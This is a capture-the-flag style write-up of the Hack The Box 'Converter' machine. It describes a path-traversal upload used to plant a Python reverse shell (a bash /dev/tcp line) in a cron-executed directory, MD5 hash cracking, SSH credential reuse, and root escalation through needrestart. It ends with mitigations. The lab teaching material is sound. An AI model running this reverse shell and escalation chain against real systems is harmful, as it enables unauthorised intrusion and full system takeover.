---
author: MaxisFront
categories:
- WriteUps
date: 2026-05-24
description: 'HTB Converter Machine | Challenge made by: FisMatHack'
draft: false
hideReadingTime: false
image: Conversor_Shield.png
tags:
- Linux
- Web
- Caido
- Path-traversal
- GTFObins
- SUID
- CVE-2024-48990
title: 'WriteUp: Converter | HTB'
---
> All rights reserved to **Hack The Box LTD**.

{{< alert info >}}

> Summary

- Exploitation of `Path Traversal` to gain `RCE`
- Extraction and cracking of hashes `MD5` via `Hashcat`
- Reuse of credentials for access via `SSH`
- Exploitation of the command's SUID `needrestart` (`CVE-2024-48990`)
- Security recommendations to prevent and mitigate vulnerabilities on this machine.

{{< /alert>}}

#### Skills Used

- Port enumeration
- Use of basic GNU/Linux-based commands
- Exploitation via UFU and RCE
- Searching for and using Critical CVEs
- Exploitation of vulnerable SUID

#### Tools Used

- Nmap
- Caido
- Netcat
- Strings
- Hashcat
- SSH
- sudo
- needrestart

------------------------------------------------------------------------

## Vulnerability Assessment and Analysis

The platform `HTB` provides us with the `IP` target, which is the `10.129.12.212`, an address that can be reached by connecting through the `VPN` assigned to us by the platform.

### Port Scanning

We perform a scan of the 65,535 ports `TCP` on the system using the tool `Nmap`, focusing on those with an open status:

<div id="cb1" class="sourceCode">

``` sourceCode
nmap -p- --min-rate 5000 -Pn -n -oN nmap-scan 10.129.12.212
```

</div>

![Arp-Scan output](images/1_Conversor-nmap-scan.png)

> \<= Important =\> In enterprise environments, sending large numbers of packets `TCP`, `ICMP` or `UDP` often causes network congestion, leading to an `DoS` or being blocked by monitoring systems.

### Port Enumeration

We observe that ports 22 `(SSH)` and 80 `(HTTP)` are active. From this point, we can enumerate the services through `Nmap`.

<div id="cb2" class="sourceCode">

``` sourceCode
nmap -sCV -p22,80 -oN ports-enumeration 10.129.12.212
```

</div>

![Enumerating ports through Nmap](images/2_Conversor-ports-enumeration.png)

After analyzing the port enumeration, we can summarize the results in the following table:

| Port | Service |                            Version                            |                                                                    Notes                                                                    |
|:----:|:-------:|:-------------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------:|
|  22  |   ssh   | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | Outdated version vulnerable to **CVE-2016-6210** and **CVE-2015-5600**, although for this machine *there is another approach to the target* |
|  80  |  http   |                      Apache httpd 2.4.52                      |                                        The target is likely running an `Apache` outdated web server                                         |

> Tools such as `whatweb` (Command) or `Wappalyzer` (Browser extension) are very useful when we want to identify only the technologies present in an HTTP service.

Based on the table, we can define possible attack vectors against the target:

> - Port 22 (SSH): outdated service `OpenSSH` , possibly being used by a `Ubuntu 22.04 LTS` (Jammy Jellyfish). Possible user enumeration via `CVE-2016-6210` and `DoS` (`CVE-2015-5600`). At first glance, these are not potential direct access points to the system.
>
> - Port 80 (HTTP): Open-source website hosted via an `Apache httpd 2.4.52` . Through web enumeration, it is possible to find other vulnerabilities.

### Web Enumeration

Before accessing the target’s website `Conversor`, a `mapping` from the target IP to the page is performed temporarily. This is possible by modifying the file `/etc/hosts`:

<div id="cb3" class="sourceCode">

``` sourceCode
sudoedit /etc/hosts
```

</div>

![Map IP of Conversor into the /etc/hosts files](images/3_Conversor-map-IP-into-etc-hosts.png)

After accessing the page, a login panel can be found. To log in, we create a username and password.

The page at the address `index.html` is a section where you can upload files with the `.xml` and `.xslt`, which in itself is considered an attack vector if there is a poor implementation (`CWE-91` and/or `CWE-611`).

![Submit XML and XSLT files section](images/4_Conversor-submit-xml-xslt-files.png)

> It is worth noting that allowing users to upload files `.XSLT` is considered a potentially serious security breach, as an attacker can inject malicious code and include references to entities external to the page (Special emphasis should be placed on the vulnerabilities `XXE`).

If we go to the address `/about` we observe that it is possible to download the website’s source code:

![About page with a "Download Source Code" button](images/5_Conversor-download-sourcecode.png)

> This allows us to analyze the website’s architecture to look for security flaws (such as identifying a lack of sanitization of user-uploaded files).

After downloading and analyzing the files `app.py` , `install.md` we can highlight two critical security flaws:

|                                                        `Unrestricted File Upload` (app.py)                                                        |                                       `Cronjob` (install.md)                                       |
|:-------------------------------------------------------------------------------------------------------------------------------------------------:|:--------------------------------------------------------------------------------------------------:|
| No validation or sanitization is performed on the names of uploaded files, allowing for path manipulation (a technique known as `Path Traversal`) | Cronjob responsible for executing *all* the code `python` in the directory `/scripts` every minute |

![Content of app.py and install.md with the relevant information](images/6_Conversor-path-traversal-and-cronjob-identification.png)

These two vulnerabilities could allow an `RCE` if an attacker were able to upload a file to the address `/scripts`.

As a first step, we tried to check if it is possible to perform a `Path Traversal` through requests `POST` by modifying the parameter `filename`; to do this, we uploaded an empty file to try to modify an image at the address `conversor.htb/about`.

Using the tool `Caido`, we intercept the request and manipulate it:

![Testing the Path Traversal through the "Caido" tool](images/7_Conversor-replace-arturo-image.png)

> We modify the filename so that it can navigate through directories until it reaches the section `/about` and replace the image `arturo.png`.

After sending the request, we observed that it was possible to modify an image in the section `/about`:

![Image modified through a Path Traversal vulnerability](images/8_Conversor-modify-arturo.png-image.png)

## Exploitation

From this point on, we focused on attempting to access the computer’s system using various methods `Conversor`.

### Web

After verifying the existence of a promising attack vector, we uploaded a `revershell` written in Python, modifying the path so that our malicious code would be stored in the directory `/scripts`.

<div id="cb4" class="sourceCode">

``` sourceCode
#!/usr/bin/env python3

import os

os.system("bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'")
```

</div>

![Uploading a revershell to the /scritps directory](images/9_Conversor-revershell-path-traversal.png)

We use the tool `netcat` to enter listen mode on port `4444`. After waiting a few seconds, a connection is established with the victim server:

<div id="cb5" class="sourceCode">

``` sourceCode
nc -lvnp 4444
```

</div>

![Establishing connection through netcat](images/10_Conversor-connection-established-with-conversor.png)

After gaining access, the server’s database can be found at the address `/var/www/conversor.htb/instance/users.db`. It contains the password for the user `fismathack`, *hashed* using the algorithm `MD5` (currently vulnerable).

![User and password inside the "users.db" file](images/11_Conversor-identifying-user-and-hashed-password.png)

Using `hashacat` we can *crack* the hash using a `Dictionary Attack` as follows:

<div id="cb6" class="sourceCode">

``` sourceCode
hashcat -m 0 -a 0 hash-fismathack.txt wordlist.txt
```

</div>

> - `-m`: specifies the type of algorithm used (in this case, MD5)
> - `-a`: specifies the attack method (in this case, a dictionary attack)

### SSH

`hashcat` returns the user's password, which is `Keepmesafeandwarm`. After that, we can try to check if there is credential reuse through the service `SSH`.

<div id="cb7" class="sourceCode">

``` sourceCode
ssh fismathack@conversor.htb #Keepmesafeandwarm
```

</div>

![Access via SSH with the user fismathack](images/12_Conversor-access-via-ssh-with-fismathack-user.png)

After logging in as the user `fismathack`, we check if we have the ability to execute binaries with `SUID`.

<div id="cb8" class="sourceCode">

``` sourceCode
sudo -l
```

</div>

![binary with SUID permission](images/13_Conversor-binaries-with-sudo-permissions.png)

### CVE-2024-48990

We observe that the user `fismathack` can run `needrestart` as an administrator; a quick search on the page `GTFObins` shows that this binary can execute `perl` stored in a file with the extension `.conf`.

![Indications to abuse the binary needrestart, from "GTFObins"](images/14_Conversor-gftobins-needrestart.png)

We create a configuration file (for example, `test.conf`). This way, when we ask `needrestart` it to load an *additional configuration* file, it executes a `shell` inherited with user permissions `root`.

![Privilege Escalation through the needrestart binary](images/15_Conversor-privilege-escalation-with-needrestart-binary.png)

Now we have a session `bash` as the user `root`, taking full control of the system `Conversor`.

## Impact

An attacker with the permissions of a regular user such as `www-data` or `fismathack` has the following capabilities:

> - Read files from the web application in the directory `/var/www/conversor.htb`.
> - Access the database `users.db`, exposing user credentials.
> - Ability to execute `scripts` and establish persistent sessions.
> - Ability to enumerate other systems on the network and perform lateral movement.

An attacker with administrator privileges gains the ability to:

> - Establishing persistence between sessions and controlling server traffic.
> - Manipulation of `cronjobs` to execute malicious tasks.
> - Installation of `backdoors` at the kernel level.

# Summary

The machine `Conversor` exhibited a series of critical vulnerabilities (**not all of which are detailed in this WriteUp**), such as performing a `Path Traversal` and subsequently a `RCE`, as well as a `Credential Reuse` and exploitation of a `SUID`, among others. Therefore, the following section will outline the findings, their severity, and guidelines for preventing this type of security breach.

### Findings

> Unrestricted file uploads and `Path Traversal`

| ID  |                        **Vulnerability**                        |               **Threat Level**               |                                                                    Description                                                                    |
|:---:|:---------------------------------------------------------------:|:----------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------:|
| MF1 | CWE-35 and CWE-434: Path Traversal and Unrestricted File Upload | {{< exptag "critica">}} Critical {{</exptag >}} | Lack of sanitization in the parameter `filename` in the code `app.py`, allowing file overwriting and hosting of malicious code in arbitrary paths |

{{< alert error >}} Immediate Measures

> - Implement functions that remove characters allowing directory traversal (`../`) in the name of the uploaded file.
> - Implement an isolated environment within a container or *sandbox*.
> - Strictly validate extensions, content (`Magic Bytes`) and structure of uploaded files (`.xml` and `.xslt`).

{{< /alert>}}

> Exploitation of `XXE` in files `.xslt`

| ID  |                      **Vulnerability**                      |               **Threat Level**               |                                                          Description                                                           |
|:---:|:-----------------------------------------------------------:|:----------------------------------------:|:------------------------------------------------------------------------------------------------------------------------------:|
| MF2 | CWE-611: Improper Scoping of XML External Entity References | {{< exptag "critica">}} Critical {{</exptag >}} | Insecure file processing `.xslt`, allowing reading and writing of system files, as well as execution of commands on the server |

{{< alert error >}} Immediate actions:

> - Apply a `parser` secure approach when processing files `.xslt`, using measures such as `resolve_entities=False`, `no_network=True`.
> - Establish a strict security profile, disabling file read, write, and command execution capabilities within the system and network.

{{< /alert>}}

> `Dictionary Attack` against algorithm `MD5`

| ID  |                              **Vulnerability**                              |              **Threat Level**              |                          Description                           |
|:---:|:---------------------------------------------------------------------------:|:--------------------------------------:|:--------------------------------------------------------------:|
| MF3 | CWE-328 and CWE-522: Weak Hash Usage and Insufficient Credential Protection | {{< exptag "alta">}} High {{</exptag >}} | Credentials exposed in `users.db` and weak `hash` weak (`MD5`) |



{{< alert error >}} Immediate measures:

> - Use modern and robust cryptographic functions `hash` modern and robust cryptographic functions (such as `Argon2id` or `SHA-512`).
> - Use `salting` unique and random for each new password generated by the user.

{{< /alert>}}

> Leveraging `SUID` in the `needrestart`

<table>
<colgroup>
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">ID</th>
<th style="text-align: center;"><strong>Vulnerability</strong></th>
<th style="text-align: center;"><strong>Threat Level</strong></th>
<th style="text-align: center;">Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">MF4</td>
<td style="text-align: center;">CWE-269: Improper Privilege Handling</td>
<td style="text-align: center;">{{< exptag "critica">}} Critical {{</exptag >}}</td>
<td style="text-align: center;">The local user <code>fismathack</code> with execution capabilities <code>needrestart</code>, with the ability to inject code <code>perl</code>, obtaining a <code>shell</code> such as <code>root</code>.<br />
</td>
</tr>
</tbody>
</table>

{{< alert error >}}

To mitigate an attacker’s ability to escalate privileges, it is recommended to:
>
> - Remove administrator execution permissions for the user `fismathack` for the execution of `needrestart` the file `/etc/sudoers`.
> - If strictly necessary, restrict the `-c`, or allow absolute, write-protected configuration paths for the user `fismathack`.

{{< /alert>}}
